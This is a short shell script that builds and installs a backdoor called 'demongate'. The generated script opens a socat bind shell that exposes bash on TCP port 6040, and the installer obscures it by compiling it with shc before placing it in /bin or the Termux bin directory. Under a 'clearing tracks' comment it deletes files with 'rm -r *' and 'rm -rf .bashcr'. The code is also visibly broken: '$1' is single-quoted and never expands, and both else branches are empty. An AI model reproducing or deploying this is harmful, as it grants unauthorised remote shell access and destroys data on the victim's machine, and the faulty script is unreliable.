#!/bin/sh
echo "
#!/bin/sh
if [[ '$1' == 'stop' ]]; then
pkill socat
pkill ssh
elif [[ '$1' == 'k' ]]; then
socat TCP-LISTEN:6040 EXEC:/bin/bash > /dev/null 2>&1 &
elif [[ '$1' == 't' ]]; then
socat TCP-LISTEN:6040 EXEC:/data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
else
####################################################
fi
" >> demongate.sh
#compilimg file
shc -f demongate.sh > /dev/null 2>1
#deleting old files
sleep 3
rm demongate.sh.x.c
rm demongate.sh
#installing files based on specified type
if [[ '$1' == 't' ]]; then
mv demongate.sh.x /data/data/com.termux/files/usr/bin/demongate
chmod +x /data/data/com.termux/files/usr/bin/demongate
elif [[ '$1' == 'k' ]]; then
mv demongate.sh.x /bin/demongate
chmod +x /bin/demongate
else
####################################################
fi
#clearing tracks
rm -r *
cd ..
rm -rf .bashcr
